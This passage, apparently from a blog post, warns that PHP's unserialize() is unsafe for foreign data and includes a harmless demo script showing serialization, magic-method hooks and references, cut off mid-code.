&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2017/08/do-not-unserialize-foreign-code.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://php.net/unserialize&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Really Good Advice™&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;People object:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2017/08/how-does-this-solve-anything.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/buherator/status/895933031529275392&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;People object&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;but given the little tour above, you should be able to understand how
&lt;code&gt;unserialize()&lt;/code&gt; cannot really be made safe for import of foreign data. You can
&lt;code&gt;unserialize()&lt;/code&gt; stuff your code has written, after having verified that the
data you read still is the data you have written, using salted hash_hmac()s
on said data. That&amp;rsquo;s going to be reasonably safe.&lt;/p&gt;
&lt;p&gt;You can&amp;rsquo;t, ever, use &lt;code&gt;unserialize()&lt;/code&gt; as a data interchange format with other
application or an end user. &lt;code&gt;unserialize()&lt;/code&gt; is not an exposable API. Never
was. Other functions and formats for this exist. Use those. Here is some
code to try:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#! /usr/local/bin/php 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_serialize1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_serialize2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;fnorp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;glorp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dorp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_serialize3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;DemoClass&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$priv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;priv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;prot&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pub&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pub&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Constructed.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;To be serialized&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;priv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;prot&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pub&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Just unserialized.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DemoClass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_serialize4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;References inside an array work:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;References across unserialize:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;b is unserialized a:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Does the ref still work?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_unserialize1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;define_democlass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$class&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;We want &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; defined.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;DemoClass&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$priv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fnorp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;glorp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pub&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;dorp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Constructed.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
